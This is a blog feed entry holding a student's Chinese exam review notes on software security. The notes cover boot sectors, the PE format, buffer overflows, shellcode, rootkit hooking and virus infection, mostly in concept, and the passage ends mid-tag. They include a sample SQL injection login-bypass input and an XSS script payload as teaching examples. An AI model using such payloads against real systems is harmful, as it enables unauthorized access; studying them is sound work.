<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>夏日 の blog</title>
  
  
  <link href="https://zss192.github.io/atom.xml" rel="self"/>
  
  <link href="https://zss192.github.io/"/>
  <updated>2021-08-01T10:17:31.616Z</updated>
  <id>https://zss192.github.io/</id>
  
  <author>
    <name>夏日</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>软件安全期末总结</title>
    <link href="https://zss192.github.io/2021/07/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    <id>https://zss192.github.io/2021/07/05/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/</id>
    <published>2021-07-05T08:41:56.000Z</published>
    <updated>2021-08-01T10:17:31.616Z</updated>
    
    <content type="html"><![CDATA[<h1>写在前面</h1><p>所用教材：彭国军等人编著的第一版</p><p>博客地址：<a href="https://blog.csdn.net/zss192">https://blog.csdn.net/zss192</a></p><p>说明：博客为根据老师所画重点有针对性的总结，供个人复习使用，仅供参考</p><h1>第一章 软件安全概述</h1><h3 id="1-软件安全包括三个方面：（P5）"><a class="header-anchor" href="#1-软件安全包括三个方面：（P5）">¶</a>1.软件安全包括三个方面：（P5）</h3><ul><li>软件自身安全(软件缺陷与漏洞)、恶意软件攻击与检测、软件逆向分析(软件破解)与防护</li></ul><h3 id="2-软件缺陷或漏洞被触发后典型的威胁有：（P6）"><a class="header-anchor" href="#2-软件缺陷或漏洞被触发后典型的威胁有：（P6）">¶</a>2.软件缺陷或漏洞被触发后典型的威胁有：（P6）</h3><ul><li>软件正常功能被破坏、系统被恶意控制</li></ul><h3 id="3-恶意软件对软件及信息系统的威胁有：（P6）"><a class="header-anchor" href="#3-恶意软件对软件及信息系统的威胁有：（P6）">¶</a>3.恶意软件对软件及信息系统的威胁有：（P6）</h3><ul><li>已有软件的功能被修改或破坏</li><li>目标系统中的重要数据被窃取</li><li>目标系统中的用户行为被监视</li><li>目标系统被控制</li></ul><h3 id="4-微软的SDL开发模式（P9）"><a class="header-anchor" href="#4-微软的SDL开发模式（P9）">¶</a>4.微软的SDL开发模式（P9）</h3><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210625144914501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pteDI0NzMxNjI2MjE=,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h3 id="5-可信计算的基本思想（P10简答）"><a class="header-anchor" href="#5-可信计算的基本思想（P10简答）">¶</a>5.可信计算的基本思想（P10简答）</h3><p>首先建立一个信任根，信任根的可信性由物理安全和管理安全确保(目前以TPM作为信任根)，再建立一条信任链,从信任根开始到硬件平台、到操作系统、再到应用，一级认证一级，一级信任一级，从而把这种信任边界扩展到整个计算机系统。</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210625145003905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pteDI0NzMxNjI2MjE=,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1>第二章 软件安全基础</h1><h3 id="1-磁盘的三个基本参数-CHS参数-P13计算"><a class="header-anchor" href="#1-磁盘的三个基本参数-CHS参数-P13计算">¶</a>1.磁盘的三个基本参数(CHS参数) (P13计算)</h3><ul><li>磁头数：有多少个盘片，最大为255(0-255)</li><li>柱面数：一个盘片有多少圈，最大为1023(0-1023)</li><li>扇区数：一圈有多少个扇区，最大为63(1-63)（每个扇区一般为512B）</li><li>最大容量 = (255x1023x63x512)/1048576=8024MB（1MB=2<sup>20</sup>B=1048576B）</li></ul><blockquote><p>最大容量=磁头数x柱面数x扇区数x每个扇区的大小<br>硬件厂商一般用1M=1000000计算容量，注意单位换算</p></blockquote><h3 id="2-BIOS-Int13H（P13）"><a class="header-anchor" href="#2-BIOS-Int13H（P13）">¶</a>2.BIOS Int13H（P13）</h3><p>BIOS Int13H调用是BIOS提供的磁盘基本输入输出中断调用，它可以完成磁盘的复位、读写、检验、定位、诊断、格式化等功能，使用CHS寻址方式，最大能识别8GB左右的硬盘。</p><h3 id="3-主引导扇区的组成（P15）"><a class="header-anchor" href="#3-主引导扇区的组成（P15）">¶</a>3.主引导扇区的组成（P15）</h3><p>主引导扇区就是硬盘的第一个扇区(0面0磁道1扇区)，它由以下三部分组成</p><ul><li>主引导记录(MBR)：占用前446字节，存放着系统主引导程序<ul><li>MBR有时也指整个主引导扇区，有时指前446字节的主引导记录</li></ul></li><li>硬盘主分区表(DPT)：占用64字节，记录磁盘的基本分区信息。分为四个分区项，每项16字节，分别记录每个主分区的信息(因此最多可以有4个主分区)</li><li>引导扇区标记：占用两个字节，合法引导区固定等于0xAA55，是判断引导区是否合法的标志</li></ul><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210626224349.jpg"  alt=""></p><h3 id="4-主分区、扩展分区和逻辑分区的区别（P16）"><a class="header-anchor" href="#4-主分区、扩展分区和逻辑分区的区别（P16）">¶</a>4.主分区、扩展分区和逻辑分区的区别（P16）</h3><ul><li>主分区：也叫引导分区，最多能创建4个，主分区就是引导电脑开机读取文件的一个磁盘分区（数量1-4）</li><li>扩展分区：解决最多只能创建4个分区的问题，主引导分区必须有一个基本扩展分区项，其它扩展分区以链表形式存放。划分主分区后剩余的就是扩展分区。（数量0-1且主分区+扩展分区≤4）</li><li>逻辑分区：扩展分区并不能直接使用，必须再分成逻辑分区才能使用（数量0-n）</li></ul><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210626224248.jpg"  alt=""></p><blockquote><p>系统中看到的盘都是主分区或者逻辑分区</p><p>助记：正常情况只需要划分主分区，但要想划分4个以上分区就要划分扩展分区，这时会有3个主分区1个扩展分区，但扩展分区不能直接用，我们可以再在其基础上划分成两个逻辑分区，这两个分区就是我们平常看到的盘，至此，当前共有3+2=5个分区可用。如果扩展分区并不全都划分成逻辑分区，那么剩余的磁盘空间还是扩展分区，只不过这部分空间不能使用。</p><p>新硬盘建立分区过程：建立主分区→建立扩展分区→建立逻辑分区→激活主分区→格式化所有分区</p></blockquote><p><img src="/" class="lazyload" data-src="https://pic4.zhimg.com/80/ab32617b085d43ab312d311e9417bc65_720w.jpg?source=1940ef5c"  alt="img"></p><p><img src="/" class="lazyload" data-src="https://pic2.zhimg.com/80/deb2ed8191d13feaac4acd09a5f893bd_720w.jpg?source=1940ef5c"  alt="img"></p><h3 id="5-当前系统流行的引导形式是什么？它与BIOS引导有什么区别？（P15）"><a class="header-anchor" href="#5-当前系统流行的引导形式是什么？它与BIOS引导有什么区别？（P15）">¶</a>5.当前系统流行的引导形式是什么？它与BIOS引导有什么区别？（P15）</h3><p>传统模式：BIOS引导，硬盘分区类型必须是MBR</p><p>当前模式：UEFI引导，硬盘分区类型必须是GPT</p><p>区别如下：</p><p>（1）效率方面：大部分BIOS代码使用汇编语言开发，开发效率低；在UEFI中，绝大部分代码采用C语言编写，效率较高。<br>（2）性能方面：BOIS需要通过中断来完成，开销大，性能低；UEFI舍弃了中断方式，仅仅保留了时钟中断。外部设备的操作采用“事件+异步操作”完成，性能大大提高。<br>（3）扩展性方面：BIOS代码采用静态链接，不提供动态加载设备驱动的方案，功能扩展性差，升级缓慢；UEFI系统的可扩展性体现在两个方面：一是驱动的模块化设计；二是软硬件升级的兼容性，使得系统升级过程更加简单、平滑。<br>（4）安全方面：BIOS运行过程中对可执行代码没有安全方面的考虑；当系统的安全启动功能被打开后，UEFI在执行应用程序和驱动前会先检测程序和驱动的证书，仅当证书被信任时才会执行这个应用程序或驱动。</p><h3 id="6-文件系统（P16）"><a class="header-anchor" href="#6-文件系统（P16）">¶</a>6.文件系统（P16）</h3><ul><li>Windows系统：FAT12、FAT16、FAT32(单个文件最大4G)、NTFS、WINFS等</li><li>Linux系统：Ext2、Ext3、Ext4、Minix、NTFS等</li></ul><h3 id="7-80X86处理器支持三种工作模式（P20）"><a class="header-anchor" href="#7-80X86处理器支持三种工作模式（P20）">¶</a>7.80X86处理器支持三种工作模式（P20）</h3><ul><li>实模式：复位或加电以实模式启动<ul><li>32位地址线只用了低20位</li><li>不能分页，指令寻址的地址就是实际物理地址</li><li>不支持优先级，所有指令工作在特权级别(优先级0)</li></ul></li><li>保护模式：80X86的一般工作模式<ul><li>32位地址都用来寻址</li><li>支持内存分页</li><li>支持虚拟内存</li><li>支持优先级机制，操作系统运行在内核模式Ring0(最高优先级)，应用程序运行在用户模式Ring3</li></ul></li><li>虚拟8086模式：在保护模式下兼容8086而设置的</li></ul><blockquote><p>DOS运行在实模式下，Windows运行在保护模式下</p></blockquote><h3 id="8-（P23）"><a class="header-anchor" href="#8-（P23）">¶</a>8.（P23）</h3><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210626225930.jpg"  width="500" /><p>用户空间：0000 0000H ~ 7FFF FFFFH</p><p>系统空间：8000 0000H ~ FFFF FFFFH</p><blockquote><p>推测给地址问在哪个空间下，只需看第一位是0-7还是8-F即可判断出来</p></blockquote><h3 id="9-内存分配与管理函数（P26）"><a class="header-anchor" href="#9-内存分配与管理函数（P26）">¶</a>9.内存分配与管理函数（P26）</h3><ul><li>分配/保留虚拟内存：VirtualAlloc(lpMem,Size,Type,Access)<ul><li>lpMem：要分配/保留的内存地址，可以为NULL</li><li>Size：要分配的内存大小，字节为单位</li><li>Type：分配的类型，如MEM_COMMINT(提交内存)</li><li>Access：保护标志，如PAGE_READONLY、PAGE_READ-WRITE(分配的内存可读可写)</li></ul></li><li>释放虚拟内存：VirtualFree(LpMem,Size,Type)<ul><li>lpMem：要释放的内存基地址</li><li>Size：要分配的内存大小，字节为单位</li><li>Type：释放的类型，如MEM_DECOMMINT(取消提交内存)、MEM_RELEASE(释放)</li></ul></li></ul><h3 id="10-请你大致写出计算机的启动过程（P28简答）"><a class="header-anchor" href="#10-请你大致写出计算机的启动过程（P28简答）">¶</a>10.请你大致写出计算机的启动过程（P28简答）</h3><p>主要可分为四个阶段</p><ul><li>（1）BIOS：首先进行硬件自检(POST)，若有故障会发出蜂鸣声，然后按照启动顺序选择从哪个设备启动</li><li>（2）主引导记录(MBR)：读取设备的前512字节，判断设备能否启动，若不能则按启动顺序尝试启动下一个设备。然后BIOS会依次遍历主分区找到激活分区</li><li>（3）硬盘启动：计算机会读取激活分区的第一个扇区即卷引导记录(VBR），VBR告诉计算机操作系统位于该分区的哪个位置，然后计算机就可以加载操作系统了</li><li>（4）操作系统：首先载入操作系统的内核。例如Linux，先载入/boot下的kernel，然后产生init进程，init进程会加载各个模块，等待用户输入用户名和密码。至此，全部启动过程完成。</li></ul><h3 id="11-PE文件格式（P34）"><a class="header-anchor" href="#11-PE文件格式（P34）">¶</a>11.PE文件格式（P34）</h3><p>PE(Portable Executable,可移植的执行体)是Win32环境自身所带的可执行文件格式。它的一些特性继承自UNIX的COFF(Common Object File Format)文件格式。</p><p>可移植的执行体意味着此文件格式是跨Win32平台的,即使 Windows运行在非 Intel的CPU上，任何Win32平台的PE装载器都能识别和使用该文件格式。</p><p>当然，移植到不同的CPU上PE执行体必然得有一些改变。除VxD和16位的DLL外，所有Win32执行文件都使用PE文件格式。因此,研究PE文件格式是我们洞悉 Windows结构的良机。</p><h3 id="12-一般来说，Win32病毒是怎样被运行的（P35简答）"><a class="header-anchor" href="#12-一般来说，Win32病毒是怎样被运行的（P35简答）">¶</a>12.一般来说，Win32病毒是怎样被运行的（P35简答）</h3><ul><li>用户点击(或者系统自动运行)HOST程序</li><li>装载HOST程序到内存中</li><li>通过PE文件中的ImageBase(优先装载地址即基地址)和AddressOfEntryPoint(代码入口的RVA(偏移)地址)之和定位第一条语句的位置<ul><li>如imagebase：0x40 0000，AddressOfEntryPoint：0x00 12C0，即0x4012c0</li></ul></li><li>从第一条语句开始执行(病毒代码可能在此时，也可能在HOST代码运行过程中获得控制权)</li><li>病毒主体代码执行完毕，将控制权交还给HOST程序</li><li>HOST程序继续执行</li></ul><h3 id="13-PE文件结构（P35）"><a class="header-anchor" href="#13-PE文件结构（P35）">¶</a>13.PE文件结构（P35）</h3><p><img src="/" class="lazyload" data-src="https://www.pianshen.com/images/32/e54937033581df036b0228ad9de2a310.png"  alt="img"></p><h3 id="14-病毒如何判断一个文件是不是PE文件（P37）"><a class="header-anchor" href="#14-病毒如何判断一个文件是不是PE文件（P37）">¶</a>14.病毒如何判断一个文件是不是PE文件（P37）</h3><p>看文件的前两个字节是不是4D5A(MZ)，若不是则说明不是PE文件</p><p>若是，在DOS程序头中的偏移3CH处的四个字节找到PE字串的偏移位置，查看该偏移位置的四个字节是不是50 45 00 00(PE…)，若不是则不是PE文件，若是则认为它是一个PE文件</p><h3 id="15-导出表结构（P43）"><a class="header-anchor" href="#15-导出表结构（P43）">¶</a>15.导出表结构（P43）</h3><blockquote><p>导出表：表明自己可以提供哪些函数供别的程序调用，类似于餐厅的菜单</p></blockquote><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210627002618.jpg"  alt=""></p><p>其中AddressOfNameOridinals指向的数组的项目与文件名地址表的项目一一对应，项目的值代表函数入口地址表的索引，这样函数名称就和函数入口地址关联起来了</p><h3 id="16-导入表结构（P44）"><a class="header-anchor" href="#16-导入表结构（P44）">¶</a>16.导入表结构（P44）</h3><blockquote><p>导入表：记录了一个exe或者一个dll所用到的其他模块导出的函数，类似于自己点的菜的清单</p></blockquote><p>结构中比较重要的为Name：DLL名字的指针如指向user32.dll</p><h1>第三章 软件缺陷与漏洞机理概述</h1><h3 id="1-漏洞的分类（P53选择）"><a class="header-anchor" href="#1-漏洞的分类（P53选择）">¶</a>1.漏洞的分类（P53选择）</h3><ul><li>按漏洞可能对系统造成的直接威胁划分<ul><li>获取访问权限漏洞、权限提升漏洞、拒绝服务攻击漏洞、恶意软件植入漏洞、数据丢失或泄露漏洞等</li></ul></li><li>按漏洞的成因划分<ul><li>输入验证错误、访问验证错误、竞争条件错误、意外情况处理错误、设计错误、配置错误、环境错误等</li></ul></li><li>按漏洞的严重等级划分可分为高、中、低三个级别<ul><li>远程和本地管理员对应为高，普通用户权限、权限提升、读取受限文件</li><li>远程和本地拒绝服务对应为中，远程非授权文件存取、口令恢复、欺骗</li><li>服务器信息泄露对应低级</li><li>上面只是通常的情况，具体情况要具体分析，如一个广泛使用软件的口令恢复漏洞应该是中或高级</li></ul></li><li>按对漏洞被利用的方式划分<ul><li>本地攻击、远程主动攻击、远程被动攻击等</li></ul></li></ul><h3 id="2-CVE、CNVD、CNNVD（P54）"><a class="header-anchor" href="#2-CVE、CNVD、CNNVD（P54）">¶</a>2.CVE、CNVD、CNNVD（P54）</h3><ul><li>CVE：MITRE公司建立的通用漏洞列表，将众所周知的安全漏洞的名称标准化，世界最权威的漏洞库。如CVE-2019-0708</li><li>CNVD：国家信息安全漏洞共享平台，类似于补天，厂商和白帽子可以提交漏洞并获得报酬</li><li>CNNVD：中国国家信息安全漏洞库，可以看成中国版的CVE，如CNNVD-202106-1647</li></ul><h3 id="3-请列举近3年来和软件缺陷、漏洞相关的重大安全事件（P64）"><a class="header-anchor" href="#3-请列举近3年来和软件缺陷、漏洞相关的重大安全事件（P64）">¶</a>3.请列举近3年来和软件缺陷、漏洞相关的重大安全事件（P64）</h3><ul><li><p>2019年，PHP7的PHP-FPM存在远程代码执行漏洞，导致攻击者可以控制服务器</p></li><li><p>2020年，微软修复了一个有关ECC证书检测绕过的漏洞，攻击者可以伪造签名，影响全球数十亿用户</p></li><li><p>2021年，高通芯片存在缓冲区溢出漏洞，攻击者可以利用该漏洞获取手机用户的短信、通话记录、监听对话等，且无法被常规系统安全功能检测到，影响全球40%的手机</p></li></ul><h1>第四章 典型软件漏洞机理分析</h1><h3 id="1-缓冲区溢出漏洞（P65）"><a class="header-anchor" href="#1-缓冲区溢出漏洞（P65）">¶</a>1.缓冲区溢出漏洞（P65）</h3><ul><li>缓冲区：指内存空间中用来存储程序运行时临时数据的一片大小有限且连续的内存区域，一般可分为栈和堆，C语言中的数组就是栈缓冲区</li><li>原理：程序在处理用户数据时，未对其大小做适当的限制，或者在拷贝、填充时没限定边界，导致实际操作的数据大小超过了目标缓冲区的大小，使得一些关键数据被覆盖，从而引发安全问题</li><li>利用该漏洞，攻击者可植入并执行攻击代码，获得一定的系统权限，从而得到被攻击主机的控制权</li></ul><h3 id="2-内存根据进程使用的内存区域的预定功能划分（P66）"><a class="header-anchor" href="#2-内存根据进程使用的内存区域的预定功能划分（P66）">¶</a>2.内存根据进程使用的内存区域的预定功能划分（P66）</h3><ul><li>代码区：存储被装入执行的二进制机器代码，通常只读不可修改</li><li>静态数据区：存储全局变量，可划分为初始化的数据区和未初始化的数据区</li><li>动态数据区<ul><li>栈区：存储函数之间的调用关系以及函数内部的变量，保证被调用函数返回时回到父函数中继续执行</li><li>堆区：程序运行时向系统动态申请的内存空间位于堆区，用完之后需主动释放，如C/C++中的malloc/new</li></ul></li></ul><h3 id="3-系统栈（P67）"><a class="header-anchor" href="#3-系统栈（P67）">¶</a>3.系统栈（P67）</h3><ul><li>定义：OS为进程中的每个函数调用都划分了一个栈帧空间，系统栈则是这些函数调用栈帧的集合</li><li>函数返回地址：函数调用语句的后面一条指令的地址，以便返回时能恢复到被调用前的代码区中继续执行</li><li>ESP：栈指针寄存器，存放的是当前栈帧的栈顶指针</li><li>EBP：基址指针寄存器，存放的是当前栈帧的栈底指针</li><li>EIP：指令寄存器，存放的是下一条等待执行的指令地址<ul><li>当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行</li></ul></li></ul><h3 id="4-栈溢出的利用（P69）"><a class="header-anchor" href="#4-栈溢出的利用（P69）">¶</a>4.栈溢出的利用（P69）</h3><ul><li>修改邻接变量：函数的局部变量依次存放在栈帧中，若其中有数组之类的缓冲区，数组越界后可能破坏相邻变量的值，甚至EBP或返回地址</li><li>修改函数返回地址：可随意更改程序指向并执行攻击者植入的代码，实现&quot;自主&quot;控制<ul><li>方法1：将内存中的shellcode的地址赋给返回地址<ul><li>但由于动态链接库的装入和卸载，shellcode的地址是动态变化的，因此之后会出现跳转异常</li><li>且shellcode的开始位置通常为0X00，进行字符串操作如strcpy可能会被截断</li></ul></li><li>方法2：用系统动态链接库中某条处于高地址且位置固定的跳转指令所在的地址进行覆盖，指向动态变化的shellcode地址</li></ul></li><li>S.E.H结构覆盖：程序出错之后系统关闭程序之前，让程序转去执行一个预先设定的回调函数<ul><li>S.E.H即异常处理结构体，发生异常时(如除零)会用到</li><li>方法：把S.E.H中异常处理函数的入口地址改为shellcode的地址或可以跳转到shellcode的跳转指令的地址</li></ul></li></ul><h3 id="5-什么是SQL注入，举个例子（P83简答）"><a class="header-anchor" href="#5-什么是SQL注入，举个例子（P83简答）">¶</a>5.什么是SQL注入，举个例子（P83简答）</h3><p>攻击者通过把SQL命令插入到Web表单或页面请求的查询字符串，从而欺骗服务器执行恶意的SQL命令，通过提交的参数构造巧妙的SQL语句，从而获取数据库中想要的数据</p><p>如判断登录语句，select * from user where username = ‘用户名’ and password = ‘密码’。</p><p>如果根据查询到的结果数量判断账号密码是否正确，我们可以构造username=admin’#&amp;&amp;password=test</p><p>这样查询语句会变成select * from user where username = ‘admin’#’ and password = ‘test’</p><p>由于我们把admin单引号闭合了且加了一个注释符号#，那其实这条语句实际上为select * from user where username = ‘admin’</p><p>这样肯定能查到数据也就实现了任意密码都能成功登录</p><h3 id="6-什么是跨站脚本-XSS-，举个例子（P87）"><a class="header-anchor" href="#6-什么是跨站脚本-XSS-，举个例子（P87）">¶</a>6.什么是跨站脚本(XSS)，举个例子（P87）</h3><p>攻击者嵌入恶意代码到正常网页中，当用户访问该页面时，可导致恶意代码的执行，从而达到攻击用户的目的</p><p>如在http://www.test.com/test.php?message=test网址中，用户输入的message信息会显示在当前界面信息内，而如果我们构造message参数值为message=<script>alert(‘xss’);</script>，这样请求页面时就会出现内容为xss的弹框。当然对攻击者更有利的是劫持用户的cookie或重定向到其它恶意网站</p><h1>第五章 软件漏洞的利用和发现</h1><h3 id="1-什么是Exploit，分为哪几个部分（P95）"><a class="header-anchor" href="#1-什么是Exploit，分为哪几个部分（P95）">¶</a>1.什么是Exploit，分为哪几个部分（P95）</h3><p>Exploit(漏洞利用程序)是针对某一特定漏洞或一组漏洞而精心编写的漏洞利用程序。其可以触发特定漏洞从而获得系统的控制权。</p><p>分为两个部分：被注入到目标进程触发漏洞获得执行权限的二进制串，以及代表攻击者意图的代码</p><h3 id="2-可供攻击者利用的漏洞主要来源（P95）"><a class="header-anchor" href="#2-可供攻击者利用的漏洞主要来源（P95）">¶</a>2.可供攻击者利用的漏洞主要来源（P95）</h3><ul><li>黑客自己独享，未被公布、未被修复的漏洞称为0 day漏洞</li><li>其他黑客发现并公布，可以重现触发漏洞场景的POC代码(验证性代码)</li><li>安全人员或厂商公布的漏洞补丁或公告，黑客采取补丁对比等技术来定位漏洞，并开发Exploit，主要针对未及时更新补丁的用户，有时也被称为1 day或n day漏洞</li></ul><h3 id="3-Exploit结构（P96）"><a class="header-anchor" href="#3-Exploit结构（P96）">¶</a>3.Exploit结构（P96）</h3><p>把漏洞利用比作导弹发射过程，Exploit类似导弹发射装置，针对目标发射出导弹(Payload)，导弹到达目标后，释放实际危 害的弹头(类似Shellcode)爆炸；导弹除弹头外的其余部分用作定位追踪、引爆等功能对应着Payload的非Shellcode部分。</p><p>总的来说，Shellcode用来实现具体的功能，Payload还要考虑如何触发漏洞并让系统去执行Shellcode。因此shellcode往往是通用的，而Payload则是针对特定的漏洞</p><h3 id="4-漏洞利用的具体技术（P96）"><a class="header-anchor" href="#4-漏洞利用的具体技术（P96）">¶</a>4.漏洞利用的具体技术（P96）</h3><ul><li>修改内存变量</li><li>修改代码逻辑</li><li>修改函数返回地址</li><li>修改函数指针</li><li>攻击异常处理机制</li><li>修改P.E.B中线程同步函数的入口地址</li></ul><h3 id="5-什么是shellcode，干什么用的（P97）"><a class="header-anchor" href="#5-什么是shellcode，干什么用的（P97）">¶</a>5.什么是shellcode，干什么用的（P97）</h3><p>Shellcode是一段利用软件漏洞而执行的代码，用来获取shell</p><h3 id="6-函数入栈出栈（P105）"><a class="header-anchor" href="#6-函数入栈出栈（P105）">¶</a>6.函数入栈出栈（P105）</h3><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210627104132982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pteDI0NzMxNjI2MjE=,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><blockquote><p>上图为书上的原图仅供参考，要搞懂函数入栈出栈的具体流程，具体看综合题</p></blockquote><h3 id="7-常见漏洞挖掘技术的分类（P108）"><a class="header-anchor" href="#7-常见漏洞挖掘技术的分类（P108）">¶</a>7.常见漏洞挖掘技术的分类（P108）</h3><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210627104225824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pteDI0NzMxNjI2MjE=,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1>第六章 Windows系统安全机制及漏洞防护技术</h1><h3 id="1-GS编译选项（120）"><a class="header-anchor" href="#1-GS编译选项（120）">¶</a>1.GS编译选项（120）</h3><p>微软在Visual Studio编译器中加入了/GS编译选项，通过向函数的开头和结尾添加代码来阻止针对典型栈溢出漏洞的利用</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20210627152615892.png"  alt="image-20210627152615892"></p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20191019163806720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1cGVyY2hpY2tlbmNoaWNrZW4=,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>VC++6.0的编译器的设置 如静态加载</p><p>（1）直接用project&gt;add to project&gt;files的方式将.lib加入工程</p><p>（2）使用#pragma指令，如#pragma comment(lib, “your lib path and name”)</p><p>（3）在project&gt;settings&gt;link&gt;input的Additional library path中输入.lib文件所在路径</p><p><img src="/" class="lazyload" data-src="https://images2015.cnblogs.com/blog/745381/201510/745381-20151027161856013-86617546.png"  alt="img"></p><p>（4）在project-&gt;settting与Tools-&gt;Options-&gt;Directories指定路径</p><p><img src="/" class="lazyload" data-src="https://images2015.cnblogs.com/blog/745381/201510/745381-20151027162223263-831616859.png"  alt="img"></p><blockquote><p>考试出选择，会放一个设置里的图片让选</p></blockquote><h1>第八章 恶意代码及其分类</h1><h3 id="1-Rootkit（P156）"><a class="header-anchor" href="#1-Rootkit（P156）">¶</a>1.Rootkit（P156）</h3><ul><li>定义：是攻击者用来隐藏自己的踪迹和保留root访问权限的工具。Rootkit一般都和木马、后门等其他恶意程序结合使用（为统一，此处为恶意代码教材的定义）</li></ul><h3 id="2-流氓软件也称灰色软件，特点如下（P156）"><a class="header-anchor" href="#2-流氓软件也称灰色软件，特点如下（P156）">¶</a>2.流氓软件也称灰色软件，特点如下（P156）</h3><p>强制安装、难以卸载、浏览器劫持、广告弹出、恶意收集用户信息、恶意卸载、恶意捆绑</p><h3 id="3-僵尸程序（P126）"><a class="header-anchor" href="#3-僵尸程序（P126）">¶</a>3.僵尸程序（P126）</h3><p>僵尸(bot)程序是指实现恶意控制功能的程序代码。</p><p>僵尸网络：指采用一种或多种传播手段，将大量主机感染僵尸程序，从而在控制者和被感染主机之间形成一对多的控制的网络。攻击者可利用此发起DDOS攻击或发送垃圾邮件</p><h3 id="4-Exploit（P158）"><a class="header-anchor" href="#4-Exploit（P158）">¶</a>4.Exploit（P158）</h3><p>Exploit(漏洞利用程序)是针对某一特定漏洞或一组漏洞而精心编写的漏洞利用程序。其可以触发特定漏洞从而获得系统的控制权。可分为主机系统漏洞Exploit、文档类漏洞Exploit、网页挂马类Exploit</p><h1>第九章恶意代码机理分析</h1><h3 id="1-计算机病毒的特点与分类-（P161背）"><a class="header-anchor" href="#1-计算机病毒的特点与分类-（P161背）">¶</a>1.计算机病毒的特点与分类 （P161背）</h3><ul><li>传播性</li><li>非授权性</li><li>隐蔽性</li><li>潜伏性</li><li>破坏性</li><li>不可预见性</li><li>可触发性</li></ul><h3 id="2-Windows-PE病毒的感染技术（P170）"><a class="header-anchor" href="#2-Windows-PE病毒的感染技术（P170）">¶</a>2.Windows PE病毒的感染技术（P170）</h3><ul><li>病毒感染重定位：病毒随着不同HOST程序载入内存后，病毒的各个变量在内存中的位置会随着HOST程序的大小不同而发生变化，因此病毒必须对病毒代码中的变量进行重定位</li><li>获取API函数地址：病毒代码没有引入函数机制的支持，所以病毒必须自己获取API函数的地址。首先获得Kernel32的基地址，再从Kernel32中得到API函数的地址</li><li>添加新节感染：常见感染文件方式是在文件中添加一个新节，然后往新节中添加病毒代码和病毒执行返回HOST程序的代码，并修改文件中代码开始执行位置(AddressOfEntryPoint)指向新添加的病毒节的代码入口，使程序运行后先执行病毒代码</li></ul><h3 id="3-Rootkit常用技术（P221）"><a class="header-anchor" href="#3-Rootkit常用技术（P221）">¶</a>3.Rootkit常用技术（P221）</h3><ul><li>用户态HOOK：主要钩挂一些用户态的API函数<ul><li>IAT(导入地址表)钩子：IAT的每个表项存储着程序所引用的其它动态链接库文件中函数的地址，改变IAT表项的值使其指向我们的HOOK函数，即可完成钩挂操作。<ul><li>若程序采用LoadLibrary和GetProcAddress来代码动态定位函数地址，IAT钩子将会失效</li><li><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20210627163111055.png"  alt="image-20210627163111055"></li></ul></li><li>内联钩子：重写目标函数(如DLL模块中的目标函数)的代码字节，因此无论是函数正常引用机制还是通过代码动态定位函数地址，都能成功</li></ul></li><li>内核态HOOK：内核钩子是全局的且和防护软件一样都处于Ring0级更难被检测<ul><li>IDT(中断描述符表)钩子：IDT指明了每个中断处理进程的地址，通过修改这个表可在发生中断调用时改变正常执行路径</li><li>SSDT(系统服务调度表)钩子：在系统服务调用过程中，会在内核态查找此表来找到系统服务函数的地址，通过修改此表便可钩挂系统服务函数<ul><li><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20210627163519450.png"  alt="image-20210627163519450"></li></ul></li><li>过滤驱动程序：几乎所有硬件都存在驱动程序链，将Rootkit驱动程序挂接到原有的驱动程序链中，即可截获传送的数据，并对其进行修改<ul><li><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210627164515.png"  alt=""></li></ul></li><li>驱动程序钩子：每个设备驱动程序中包含一个用于处理IRP(I/O请求包)请求的函数指针表，修改这个表使其指向Rootkit函数，即可完成钩挂<ul><li><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20210627170319.png"  alt=""></li></ul></li></ul></li><li>直接内核对象操作(DKOM)：直接修改内核记账和报告所用的一些对象。DKOM很难被检测但并不能实现Rootkit的所有功能，只能对内存中用于记账的内核对象进行操作</li></ul><h3 id="4-进程隐藏技术（P224简答）"><a class="header-anchor" 